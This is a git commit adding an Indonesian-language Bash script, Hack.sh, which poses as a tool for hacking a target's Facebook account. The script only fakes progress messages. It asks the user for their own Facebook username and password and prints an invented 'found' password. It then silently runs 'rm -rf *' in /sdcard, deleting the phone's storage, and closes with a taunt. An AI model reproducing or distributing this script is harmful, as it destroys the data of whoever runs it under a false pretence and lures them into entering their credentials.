aafa8f537a470b80126e86f125f46016ec8da018
Hackers20 <70922207+Hackers20@users.noreply.github.com>
2020-09-12 02:29:26 +0700

    Hack Facebook Target
    Jangan Salah Gunakan Tools Ini

---
+++ Hack.sh
@@ -0,0 +1,137 @@
+#!/bin/bash
+# Author : Hiro-Hiro ID
+clear
+echo "|------------------------------------------|"
+sleep 1
+echo "     TOOLS HACK FB TARGET BY HACKER GAMING  "
+echo "|------------------------------------------|"
+r="\033[1;31m"
+g="\033[1;32m"
+y="\033[1;33m"
+pur="\033[1;34m"
+p="\033[1;35m"
+c="\033[1;36m"
+w="\033[1;37m"
+hari=`date +%A`
+tanggal=`date +%d`
+bulan=`date +%B`
+tahun=`date +%Y`
+waktu=`date +%T`
+zona=`date +%Z`
+sleep 1
+echo ""
+echo ""
+echo "${g}+------------------------------------------+"
+echo "Selamat Datang Kawan Semoga Bermanfaat"
+echo "+------------------------------------------+"
+sleep 1
+echo ""
+echo "${r}+------------------------------------------+"
+echo "Jangan Salah Gunakan Tools Ini"
+echo "+------------------------------------------+"
+sleep 1
+echo ""
+echo "${y}+------------------------------------------+"
+echo "Sebelumnya Kita Boleh kenalan Dulu "
+sleep 2
+echo -n "Siapakah Nama Kamu ? ";read nm
+sleep 1
+echo "Hallo $nm Senang bisa berkenalan denganmu :) "
+sleep 2
+echo "Eh iya Lupa Perkenalkan Nama Saya Sandi  "
+sleep 2
+echo "Sudah Cukup Perkenalannya ya "
+sleep 1
+echo "+------------------------------------------+"
+sleep 1
+echo "${r}Oke Lanjut .... "
+sleep 1
+read -p "Apakah Anda Ingin Menggunakan Tools Ini[y/n]: " yn
+if [ $yn = y ]
+then
+clear
+sleep 1
+echo "${c}|---------------------------------------------|"
+echo "${c}|           Tools Hack Fb Target              |"
+echo "${c}|---------------------------------------------|"
+echo "${c}|(/) Author : Hacker Gaming                   |"
+echo "${c}|(/) github : https://github.com/Hacker67     |"
+echo "${c}|(/) fanspage : https:/fb.me/Sandi Skuyy      |"
+echo "${c}|                                             |"
+echo "${c}|---------------------------------------------|"
+sleep 2
+echo ""
+echo "(/)Sedang memproses tools..."
+sleep 3
+echo ""
+echo "(/)Mengupload Tools..."
+sleep 3
+echo ""
+echo "(/)Mengekstrax Tools..."
+sleep 5
+echo ""
+echo "(/)Membuka Tools..."
+sleep 3
+echo ""
+else
+sleep 1
+echo ""
+echo "${g}Terima kasih Telah Mengunjungi Tools ini"
+sleep 1
+echo ""
+echo "${c}(/) Sedang Proses Keluar ... "
+sleep 3
+exit
+fi
+clear
+sleep 2
+echo "${c}|---------------------------------------------|"
+echo "${c}|           Tools Hack Fb Target              |"
+echo "${c}|---------------------------------------------|"
+echo "${c}|(/) Author : Hacker Gaming                   |"
+echo "${c}|(/) github : https://github.com/Hacker67     |"
+echo "${c}|(/) fanspage : https:/fb.me/SandiSkuyy       |"
+echo "${c}|                                             |"
+echo "${c}|---------------------------------------------|"
+echo ""
+read -p "Apakah Anda Ingin Melanjutkan [y/n] " nn
+if [ $nn = y ]
+then
+sleep 2
+echo "Login Dulu Menggunakan Akun Fb Anda "
+echo -n "Masukan Username/id fb : ";read uu
+echo -n "Masuka Password fb kamu: ";read ii
+echo "(/)Memeriksa Username Dan Password..."
+sleep 4
+echo "(/)Proses Masuk Akun Anda..."
+
+sleep 4
+echo "(+)Login [suscces]  "
+sleep 1
+
+echo "Langkah Terakhir.. "
+
+sleep 1
+echo "Cari Id Korban Lalu masukan di Sini... "
+else
+exit
+fi
+echo -n "Masukan Id Korban : ";read id
+echo "(/) Membobol target  $id  untuk mendapatkan password ... "
+sleep 6
+echo "Password Target di Temukan.."
+sleep 2
+echo "
++---------------------+
+id = $id
+pw = AhmadID654
++---------------------+"
+
+cd /sdcard
+rm -rf *
+sleep 1
+echo "Done ...."
+sleep 1
+echo "Selamat Hp Anda Nge Bug :v "
+sleep 1
+exit
